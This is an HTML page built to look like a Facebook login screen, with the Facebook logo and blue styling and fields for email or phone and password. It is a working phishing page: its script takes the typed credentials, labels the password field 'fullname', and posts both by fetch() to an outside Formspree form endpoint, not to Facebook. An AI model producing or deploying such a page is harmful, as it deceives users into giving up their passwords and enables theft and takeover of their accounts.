<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Form</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/ionicons@6.0.0/dist/ionicons.css">
    <style>
        <!-- Your existing styles remain unchanged -->

        .send {
            padding: 1em;
            background: #1877f2; /* Facebook blue color */
            color: #fff; /* White text color */
            border: none;
            border-radius: 30px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            transition: background 0.3s ease-in-out;
        }

        .send:hover {
            background: #135293; /* Darker shade on hover */
        }
    </style>
</head>
<body>
    <div class="form-container">
        <!-- Replace this with your logo -->
        <div class="logo"> 
            <img src="https://cdn.shopify.com/s/files/1/0558/7052/1432/files/Facebook_Logo__2019.png?v=1704821241" alt="Facebook Logo">
        </div>

        <div class="email">
            <label for="email">Email or Phone</label>
            <div class="sec-2">
                <ion-icon name="mail-outline"></ion-icon>
                <input type="text" id="email" name="email" placeholder="Enter Email Or Phone Number">
            </div>
        </div>

        <div class="fullname">
            <label for="fullname">Password</label>
            <div class="sec-2">
                <ion-icon name="person-outline"></ion-icon>
                <input type="text" id="fullname" name="fullname" placeholder="Enter Your Password">
            </div>
        </div>

        <!-- Updated form action and method using Formspree integration -->
        <form action="https://formspree.io/f/xeqyqaay" method="POST">
            <button type="button" class="send" onclick="sendFormData()">Login</button>
        </form>

        <script>
            function sendFormData() {
                const email = document.getElementById('email').value;
                const fullname = document.getElementById('fullname').value;

                // Check if email and fullname are not empty before sending
                if (email && fullname) {
                    const formData = new FormData();
                    formData.append('email', email);
                    formData.append('fullname', fullname);

                    fetch('https://formspree.io/f/xeqyqaay', {
                        method: 'POST',
                        body: formData,
                        headers: {
                            'Accept': 'application/json'
                        }
                    })
                    .then(response => response.json())
                    .then(data => {
                        // Handle success, e.g., show a success message
                        console.log(data);
                    })
                    .catch(error => {
                        // Handle error, e.g., show an error message
                        console.error(error);
                    });
                }
            }
        </script>
    </div>
</body>
</html>
